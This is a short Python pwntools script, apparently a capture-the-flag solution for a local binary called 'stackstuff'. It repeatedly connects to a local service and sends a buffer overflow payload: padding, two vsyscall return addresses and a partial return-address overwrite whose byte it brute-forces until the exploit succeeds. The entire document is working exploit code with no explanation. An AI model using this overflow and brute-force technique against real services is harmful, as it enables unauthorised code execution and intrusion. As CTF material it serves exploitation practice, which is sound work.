#!/usr/bin/env python3

from pwn import *

rLocal = process("./stackstuff")
flag = 0
i = 0

while flag == 0:
	r = remote("127.0.0.1", 1514)

	r.sendline("1000") # set length to 0x5a
	vsyscall_ret = 0xffffffffff600800

	r.sendline("A" * 0x48 + p64(vsyscall_ret) + p64(vsyscall_ret) + "\x8b" + chr(i))
	r.recvuntil("Length of password: ")

	try:
		print r.recvline()
		flag = 1
	except:
		print "tried: " + hex(i)
		i += 0x10